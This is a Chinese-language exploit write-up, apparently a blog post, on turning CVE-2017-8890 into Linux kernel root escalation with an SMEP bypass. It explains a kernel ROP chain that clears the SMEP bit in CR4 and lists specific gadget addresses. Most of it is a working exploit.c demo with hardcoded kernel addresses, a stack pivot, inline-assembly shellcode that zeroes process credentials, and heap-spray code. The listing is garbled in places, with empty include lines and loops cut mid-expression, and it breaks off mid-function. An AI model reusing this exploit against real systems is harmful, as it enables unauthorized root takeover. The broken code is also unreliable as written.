Author: `thor@MS509Team`
在上一篇文章[利用CVE-2017-8890实现linux内核提权:
ret2usr](https://xz.aliyun.com/t/2383)中，我们成功利用ret2usr攻击实现了root提权。但是如果内核开启了SMEP，那么我们的攻击将失效。在本篇文章中，我们将主要介绍SMEP的绕过方法及堆喷的改进方法。
## 0x00 SMEP绕过
我们在qemu启动命令行中加入选项：
    -cpu kvm64,+smep
这将使得linux内核不能直接跳到用户空间执行shellcode。qemu启动后我们查看cpuinfo，可以看到smep已开启：
开启后我们再执行之前的exp：
我们可以看到由于SMEP拦截了用户空间shellode的执行，内核直接崩溃。绕过SMEP目前有几种方法：
    1). 内核ROP覆盖CR4寄存器,关闭SMEP
    2). 直接内核ROP执行shellcode
    3). ret2dir，利用physmap执行shellcode
这里我们使用第一种方法。
### 1）覆盖CR4寄存器,关闭SMEP
我们知道，内核SMEP/SMAP的实现需要底层CPU的支持，而CR4寄存器就是控制SMEP/SMAP开关的寄存器。CR4寄存器是X86
CPU的一个特殊的控制寄存器，控制了CPU很多特性的开启，其布局如下所示：
我们可以看到，CR4寄存器的第20位控制了SMEP的开启，第21位控制了SMAP的开启。因此，只要我们能够将CR4寄存器的第20位清零即可关闭内核的SMEP防护机制。我们从之前的内核崩溃中可以看到，CR4寄存器的值为0x1006f0，第20位为1，表示SMEP开启：
由于我们不能在用户空间执行shellcode，我们只能先通过内核ROP关闭SMEP，再跳转到用户空间的shellcode执行提权。因此，我们在漏洞触发劫持内核EIP后，需要跳转到执行关闭SMEP的ROP
gadget。为了执行内核ROP，我们首先用ROPgadget工具dump出内核镜像的所有gadgets，方便查找:
    ROPgadget --binary vmlinux > ropgadget
查找覆盖CR4的gadget:
最终选定如下两个gadgets来关闭SMEP：
    0xffffffff810efbfd : pop rdi ; ret
    0xffffffff810496b4 : mov cr4, rdi ; pop rbp ; ret
首先通过rdi寄存器布置参数，然后执行覆盖cr4寄存器的操作。
### 2）内核ROP链
上面我们提到需要通过两个内核ROP gadgets来执行关闭SMEP的操作，但是在执行这两个gadgets之前，我们还必须执行stack
pivot等操作，构建ROP链来完成目标。首先，ROP的执行需要我们能够在内核堆栈上布置我们控制的数据，但是我们并不能控制内核堆栈，所以必须执行stack
pivot，将内核堆栈指向我们控制的空间。我们使用以下gadget:
    0xffffffff813b5122:    xchg eax, esp ; ret 0x4881
该gadget将eax寄存器和esp寄存器的值交换，而eax寄存器在劫持EIP时正好是可控的，因此可用于stack pivot，如下所示：
可以看到，eax寄存器的值正好是该gadget地址值的前4个字节，因此可以将esp劫持到0x813b5122地址，我们可以在该地址布置我们的ROP链：
执行完ROP链后我们关闭了SMEP，因此就可以跳转到用户空间的shellcode去执行提权代码了，这里的get_root函数地址就是我们在用户空间的提权shellcode。需要注意的是，在执行ROP前需要保存一些重要寄存器环境，在shellcode执行完后要恢复，防止内核处理出现异常。
### 3）Demo
综上，我们利用内核ROP绕过SMEP的exploit.c如下所示：
    #include 
    #include 
    #include   
    #include   
    #include   
    #include  
    #include  
    #include  
    #include  
    #include  
    #include  
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define SPRAY_SIZE                 5000
    #define HELLO_WORLD_SERVER_PORT    8088 
    #define Stack_Pivot_addr           0xffffffff813b5122    //  xchg eax, esp ; ret 0x4881
    #define Heap_Spray_Addr            0xcdab02ff
    unsigned long*  find_get_pid = (unsigned long*)0xffffffff81077220;
    unsigned long*  pid_task     = (unsigned long*)0xffffffff81077180;
    void *client(void *arg);
    void get_root();
    int pid=0;
    void get_root() {
        asm(
            "sub    $0x18,%rsp;"
            "pushq  %rcx;"
            "mov    pid,%edi;"
            "callq  *find_get_pid;"
            "mov    %rax,-0x8(%rbp);"
            "mov    -0x8(%rbp),%rax;"
            "mov    $0x0,%esi;"
            "mov    %rax,%rdi;"
            "callq  *pid_task;"
            "mov    %rax,-0x10(%rbp);"
            "mov    -0x10(%rbp),%rax;"
            "mov    0x5f8(%rax),%rax;"
            "mov    %rax,-0x18(%rbp);"
            "mov    -0x18(%rbp),%rax;"
            "add    $0x4,%rax;"
            "movl   $0x0,(%rax);"
            "mov    -0x18(%rbp),%rax;"
            "add    $0x8,%rax;"
            "movl   $0x0,(%rax);"
            "mov    -0x18(%rbp),%rax;"
            "add    $0xc,%rax;"
            "movl   $0x0,(%rax);"
            "mov    -0x18(%rbp),%rax;"
            "add    $0x10,%rax;"
            "movl   $0x0,(%rax);"
            "mov    -0x18(%rbp),%rax;"
            "add    $0x14,%rax;"
            "movl   $0x0,(%rax);"
            "mov    -0x18(%rbp),%rax;"
            "add    $0x18,%rax;"
            "movl   $0x0,(%rax);"
            "mov    -0x18(%rbp),%rax;"
            "add    $0x1c,%rax;"
            "movl   $0x0,(%rax);"
            "mov    -0x18(%rbp),%rax;"
            "add    $0x20,%rax;"
            "movl   $0x0,(%rax);"
            "mov    $0xcdab1028,%rax; "
            "movq   $0xffffffff81077220,(%rax); "
            "popq   %rsp;"
            "sub    $0x50, %rsp;"
            "retq;"
            );
    }
    int sockfd[SPRAY_SIZE];
    void spray_init() {
        for(int i=0; isin6_family = AF_INET6;
        psin1->sin6_port = 1234;
        // cd ab 02 ff
        inet_pton(AF_INET6, "ff02:abcd:0:0:0:0:0:1", &(psin1->sin6_addr));
        for(int j=0; jsin_family = AF_INET;
        psin->sin_addr.s_addr = htonl(inet_addr("10.10.2.224"));
        int server_socket = socket(PF_INET,SOCK_STREAM,0);
        if( server_socket < 0){
            printf("[Server]Create Socket Failed!");